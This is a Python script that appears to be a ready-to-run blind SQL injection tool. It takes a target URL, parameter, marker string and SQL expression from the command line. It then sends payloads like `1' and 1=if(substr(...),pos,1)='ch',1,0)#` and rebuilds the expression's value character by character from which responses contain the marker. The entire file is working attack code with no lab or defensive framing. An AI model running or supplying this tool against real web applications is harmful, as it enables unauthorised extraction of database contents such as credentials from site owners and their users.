import argparse
import string
import sys

import requests

# Optional tuning flags (core inputs come from CLI)
DEFAULT_MAX_LEN = 50
DEFAULT_TIMEOUT = 10.0
DEFAULT_ALPHABET = string.ascii_letters + string.digits + "_-@$.:"


def is_true(url: str, param: str, marker: str, payload: str, timeout: float) -> bool:
    resp = requests.get(url, params={param: payload}, timeout=timeout)
    return marker in resp.text


def extract_value(args) -> str:
    result = ""
    for pos in range(1, args.max_len + 1):
        found = False
        for ch in args.alphabet:
            payload = f"1' and 1=if(substr(({args.expr}),{pos},1)='{ch}',1,0)#"
            if is_true(args.url, args.param, args.marker, payload, args.timeout):
                result += ch
                print(f"\r[+] {result}", end="", flush=True)
                found = True
                break
        if not found:
            print("\n[*] No more characters detected; likely end of string", flush=True)
            break
    print()  # newline after progress line
    return result

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("url")
    parser.add_argument("--param", required=True)
    parser.add_argument("--marker", required=True)
    parser.add_argument("--expr", required=True)
    parser.add_argument("--max-len", type=int, default=DEFAULT_MAX_LEN)
    parser.add_argument("--alphabet", default=DEFAULT_ALPHABET)
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    parser.add_argument("--out", default=None)
    return parser.parse_args()


def main():
    args = parse_args()

    value = extract_value(args)
    print("\n[RESULT]")
    print(value)

    if args.out:
        try:
            with open(args.out, "w", encoding="ascii", errors="ignore") as fh:
                fh.write(value)
            print(f"[+] Saved to {args.out}")
        except OSError as exc:
            print(f"[!] Failed to write {args.out}: {exc}", file=sys.stderr)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(1)
